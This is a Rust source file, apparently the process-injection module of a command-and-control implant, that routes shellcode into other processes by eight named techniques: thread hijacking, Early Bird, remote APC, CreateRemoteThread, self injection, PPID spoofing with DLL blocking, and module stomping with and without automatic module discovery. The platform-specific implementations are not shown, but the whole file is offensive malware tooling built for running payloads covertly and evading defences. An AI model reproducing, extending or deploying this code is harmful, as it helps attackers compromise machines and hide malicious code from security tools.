// src/agent/injection/mod.rs

#[cfg(target_os = "linux")]
pub mod linux;

#[cfg(target_os = "windows")]
pub mod windows;

/// 1. Remote Injection (Thread Hijacking)
pub fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }
    
    #[cfg(target_os = "windows")]
    unsafe { windows::inject_remote_hijack(pid, shellcode) }

    #[cfg(target_os = "linux")]
    unsafe { linux::inject_remote(pid, shellcode) }

    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    Err("Not supported".into())
}

/// 2. Spawn Injection (Early Bird)
pub fn inject_spawn_early_bird(binary_path: &str, shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }

    #[cfg(target_os = "windows")]
    unsafe { windows::inject_early_bird(binary_path, shellcode) }

    #[cfg(target_os = "linux")]
    unsafe { linux::inject_spawn(binary_path, shellcode) }

    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    Err("Not supported".into())
}

/// 3. Remote APC Injection
pub fn inject_remote_apc(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }

    #[cfg(target_os = "windows")]
    unsafe { windows::inject_remote_apc(pid, shellcode) }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = pid; 
        Err("Remote APC is Windows-only. Use hijack on Linux.".into())
    }
}

/// 4. Classic Remote Thread
pub fn inject_remote_create_thread(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }

    #[cfg(target_os = "windows")]
    unsafe { windows::inject_remote_create_thread(pid, shellcode) }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = pid;
        Err("CreateRemoteThread is Windows-only.".into())
    }
}

/// 5. Self Injection
pub fn inject_self(shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }

    #[cfg(target_os = "windows")]
    unsafe { windows::inject_self(shellcode) }

    #[cfg(target_os = "linux")]
    unsafe { linux::inject_self(shellcode) }

    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    Err("Not supported".into())
}

/// 6. Advanced Spawn (PPID Spoofing + BlockDLLs)
pub fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }

    #[cfg(target_os = "windows")]
    unsafe { windows::inject_spawn_advanced(binary, parent_pid, shellcode) }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = binary;
        let _ = parent_pid;
        Err("Advanced Spawn is Windows-only".into())
    }
}

/// 7. Module Stomping
pub fn inject_module_stomping(pid: u32, dll_name: &str, shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }

    #[cfg(target_os = "windows")]
    unsafe { windows::inject_module_stomping(pid, dll_name, shellcode) }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = pid;
        let _ = dll_name;
        Err("Module Stomping is Windows-only".into())
    }
}
// Add this to the end of src/agent/injection/mod.rs

/// 8. Module Stomping (Auto-Discovery)
/// Automatically finds a loaded module with a .text section large enough for the payload.
pub fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    if shellcode.is_empty() { return Err("Shellcode is empty".to_string()); }

    #[cfg(target_os = "windows")]
    unsafe { windows::inject_module_stomping_auto(pid, shellcode) }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = pid;
        Err("Auto Stomping is Windows-only".into())
    }
}
